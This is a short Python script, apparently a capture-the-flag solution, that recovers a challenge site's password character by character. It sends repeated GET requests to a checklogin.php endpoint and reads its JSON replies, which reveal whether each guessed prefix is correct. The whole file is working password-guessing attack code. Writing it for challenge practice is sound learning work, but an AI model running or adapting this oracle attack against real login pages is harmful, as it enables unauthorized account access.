#!/usr/bin/env python3

import re
import sys
import json
import string
import urllib3
import itertools

"""
I made the website an argument since the site will be removed after the
challenge.

This challenge is to recover a password for a locked site. The site will let you 
know if each letter is right. So I will have to do this one letter at a time.
"""


urlbase = sys.argv[1]
testurl = urlbase + "/checklogin.php?q="

http = urllib3.PoolManager()


def guess_letter(current):
    chars = string.ascii_letters + string.digits + '{_-}'
    for password_length in range(1, 2):
        for guess in itertools.product(chars, repeat=password_length):
            guess = ''.join(guess)
            r = http.request('GET', testurl+current+guess)
            test = json.loads(r.data.decode('utf-8'))
            if test["fail"] != "yeah":
                return guess

pwd = ""
final_test = "alert-info"

while final_test == "alert-info":
	temp = guess_letter(pwd)
	pwd = pwd + temp
	r = http.request('GET', testurl+pwd)
	test = json.loads(r.data.decode('utf-8'))
	if test["class"] != "alert-info":
		final_test = test["class"]

sys.stdout.write(pwd)